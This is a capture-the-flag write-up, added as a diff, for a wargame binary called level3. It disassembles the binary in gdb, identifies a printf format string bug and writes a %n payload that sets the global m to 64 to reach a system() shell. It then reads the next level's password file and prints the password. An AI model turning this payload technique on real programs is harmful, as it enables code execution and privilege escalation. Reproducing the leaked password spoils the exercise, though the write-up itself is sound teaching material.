@@ -1,0 +1,167 @@
+using gdb:
+
+let's first see the functions used:
+
+---------------------------------------
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08048344  _init
+0x08048390  printf
+0x08048390  printf@plt
+0x080483a0  fgets
+0x080483a0  fgets@plt
+0x080483b0  fwrite
+0x080483b0  fwrite@plt
+0x080483c0  system
+0x080483c0  system@plt
+0x080483d0  __gmon_start__
+0x080483d0  __gmon_start__@plt
+0x080483e0  __libc_start_main
+0x080483e0  __libc_start_main@plt
+0x080483f0  _start
+0x08048420  __do_global_dtors_aux
+0x08048480  frame_dummy
+0x080484a4  v
+0x0804851a  main
+0x08048530  __libc_csu_init
+0x080485a0  __libc_csu_fini
+0x080485a2  __i686.get_pc_thunk.bx
+0x080485b0  __do_global_ctors_aux
+0x080485dc  _fini
+(gdb)
+---------------------------------------
+
+now let's disas main and v:
+main:
+
+---------------------------------------
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804851a <+0>:		push   ebp
+   0x0804851b <+1>:		mov    ebp,esp
+   0x0804851d <+3>:		and    esp,0xfffffff0
+   0x08048520 <+6>:		call   0x80484a4 <v>
+   0x08048525 <+11>:	leave
+   0x08048526 <+12>:	ret
+End of assembler dump.
+(gdb)
+---------------------------------------
+
+---------------------------------------
+(gdb) disas v
+Dump of assembler code for function v:
+   0x080484a4 <+0>:		push   ebp
+   0x080484a5 <+1>:		mov    ebp,esp
+   0x080484a7 <+3>:		sub    esp,0x218
+   0x080484ad <+9>:		mov    eax,ds:0x8049860
+   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
+   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
+   0x080484be <+26>:	lea    eax,[ebp-0x208]
+   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
+   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484cc <+40>:	lea    eax,[ebp-0x208]
+   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
+   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+   0x080484da <+54>:	mov    eax,ds:0x804988c
+   0x080484df <+59>:	cmp    eax,0x40
+   0x080484e2 <+62>:	jne    0x8048518 <v+116>
+   0x080484e4 <+64>:	mov    eax,ds:0x8049880
+   0x080484e9 <+69>:	mov    edx,eax
+   0x080484eb <+71>:	mov    eax,0x8048600
+   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
+   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
+   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
+   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
+   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
+   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
+   0x08048513 <+111>:	call   0x80483c0 <system@plt>
+   0x08048518 <+116>:	leave
+   0x08048519 <+117>:	ret
+End of assembler dump.
+(gdb)
+---------------------------------------
+
+we see that there is a main function calling another function called v
+the function takes input using fgets then print it using printf
+and that is what we can call format string vulnerability
+
+------format string vulenerability-----
+format string exploits can be used to crash a program or to execute harmful code. 
+The problem stems from the use of unchecked user input as the format string
+parameter in certain C functions that perform formatting, such as printf(). 
+---------------------------------------
+
+the function v has after the print a cmp that compares a number 64 with a
+variable, after searching we see that the variable is "m" that is on the bss because
+it is uninitialized,  If it were initialized, it would exist in the data memory
+segment
+
+---------------bss---------------------
+bss is the portion of an object file, executable, or assembly language code that
+contains statically allocated variables that are declared but have not been
+assigned a value yet.
+---------------------------------------
+
+?so we need a way to make that number m turn to the value 64 somehow
+
+if we check all the printf flags we notice something interesting in %n flag
+it's a flag that takes address of an int and print how many characters to get to it
+
+----------example for %n---------------
+int main()
+{
+  int c;
+  printf("geeks for %ngeeks ", &c);
+  printf("%d", c);
+  getchar();
+  return 0;
+}
+output > geeks for geeks 10
+---------------------------------------
+
+so using %n we actually can make m get the value of 64
+
+firstly we need to get the variable m address
+if we use "objdump -t level3 | grep m
+ps : The -t flag displays the contents of the symbol table.
+"
+we get:
+  > 0804988c g     O .bss	00000004              m
+
+so now we know that the m address is 0804988c
+
+if we see how printf args works in the stack we will see that we just need
+to inject the m adress first so it can hold the value of %n kinda like using
+printf("%n", m)
+
+but we know that we need 64 bytes so m get 64, knowing an int is 4bytes so we need
+exactly 64bytes
+
+so we need to inject m adress 4bytes(0804988c)
+then inject the rest 60
+
+then we will save the number of bytes printed using %4$n
+moving 4 addresses inside the stack, the ones we wrote on the stack:
+---------------------------------------------
+(gdb) run <<< $(python -c "print 'AAAA ' + '%x ' * 20")
+Starting program: /home/user/level3/level3 <<< $(python -c "print 'AAAA ' + '%x ' * 20")
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a
+[Inferior 1 (process 2759) exited normally]
+---------------------------------------------
+
+we can do this using a python code:
+
+--[ print '\x8c\x98\x04\x08' + '%60x' + '%4\$n'" ] --
+
+-> \x8c\x98\x04\x08 the address of m but it s endean way of writing
+-> %60x is the 60 bytes we need
+-> %4\$n using it to store the number of bytes printed
+
+---------------------------------------------
+cat <(python -c "print '\x8c\x98\x04\x08' + '%60x' + '%4\$n'") - | ./level3
+�                                                         200
+Wait what?!
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
